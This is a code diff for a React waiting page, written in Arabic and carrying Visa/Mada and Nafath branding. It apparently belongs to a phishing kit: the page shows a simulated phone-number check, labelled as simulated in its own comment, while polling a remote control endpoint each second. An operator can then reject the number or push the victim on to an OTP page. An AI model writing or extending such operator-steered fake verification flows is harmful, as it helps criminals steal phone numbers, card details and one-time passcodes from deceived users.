@@ -1,22 +1,50 @@
 import { useEffect, useState } from "react";
 import { useLocation } from "wouter";
 import { Header } from "@/components/layout/Header";
-import { Loader2 } from "lucide-react";
-import { sendAdminControl } from "@/lib/api";
+import { Loader2, XCircle } from "lucide-react";
+import { useQuery } from "@tanstack/react-query";
+import { getControl } from "@/lib/api";
 import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";
 
 export default function NomerWait() {
   const [, setLocation] = useLocation();
   const [message, setMessage] = useState("جارٍ التحقق من الرقم...");
+  const [error, setError] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
   
+  const sessionId = localStorage.getItem("sessionId");
+  
+  // Check for control messages
+  const { data: controlData } = useQuery({
+    queryKey: ["control", sessionId],
+    queryFn: () => getControl(sessionId!),
+    refetchInterval: 1000,
+    enabled: !!sessionId,
+  });
+
   useEffect(() => {
+    if (!controlData) return;
+    
+    if (controlData.action === "nomer_error") {
+      setError(true);
+      setErrorMessage("رقم الهاتف غير صحيح. يرجى التأكد وإعادة المحاولة.");
+      setMessage("تم رفض الطلب");
+    } else if (controlData.action === "go_otp") {
+      localStorage.setItem("nomerVerified", "true");
+      setLocation("/otp");
+    }
+  }, [controlData, setLocation]);
+
+  useEffect(() => {
+    if (error) return;
+    
     // Simulate checking process
     const timer = setTimeout(() => {
       setMessage("جارٍ الاتصال بمزود الخدمة...");
     }, 3000);
 
     return () => clearTimeout(timer);
-  }, []);
+  }, [error]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
@@ -28,18 +56,24 @@ export default function NomerWait() {
           <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-6 object-contain" />
           
           <div className="flex flex-col items-center justify-center mb-6">
-            <Loader2 className="w-16 h-16 animate-spin text-primary mb-4" />
+            {error ? (
+              <XCircle className="w-16 h-16 text-red-500 mb-4" />
+            ) : (
+              <Loader2 className="w-16 h-16 animate-spin text-primary mb-4" />
+            )}
           </div>
           
           <h2 className="text-xl font-bold text-gray-800 mb-4">التحقق من رقم الجوال</h2>
           
           <p className="text-gray-600 mb-8 leading-relaxed">
-            {message}
+            {error ? errorMessage : message}
           </p>
           
-          <p className="text-sm text-gray-500">
-            يرجى عدم إغلاق هذه الصفحة
-          </p>
+          {!error && (
+            <p className="text-sm text-gray-500">
+              يرجى عدم إغلاق هذه الصفحة
+            </p>
+          )}
         </div>
       </div>
 
